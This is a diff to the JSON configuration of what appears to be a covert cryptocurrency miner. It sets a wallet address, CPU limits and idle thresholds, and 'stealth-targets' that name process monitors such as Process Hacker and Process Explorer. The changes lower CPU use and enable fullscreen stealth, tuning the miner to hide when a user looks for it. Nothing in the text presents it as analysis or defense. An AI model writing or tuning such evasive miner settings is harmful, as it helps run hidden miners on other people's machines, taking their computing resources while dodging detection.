@@ -4,12 +4,12 @@
     "port": 9200,
     "wallet": "3JogVSeyJVWpVqN2W6QQbZaCkZJZuRM8Jz.USER-TM4109fzlmzJves",
     "password": "",
-    "nicehash": true,
-    "ssltls": true,
-    "max-cpu": 30,
-    "idle-wait": 1,
-    "idle-cpu": 90,
-    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "nicehash": false,
+    "ssltls": false,
+    "max-cpu": 10,
+    "idle-wait": 15,
+    "idle-cpu": 10,
+    "stealth-targets": "ProcessHacker.exe,procexp64.exe",
     "kill-targets": "",
-    "stealth-fullscreen": false
+    "stealth-fullscreen": true
 }
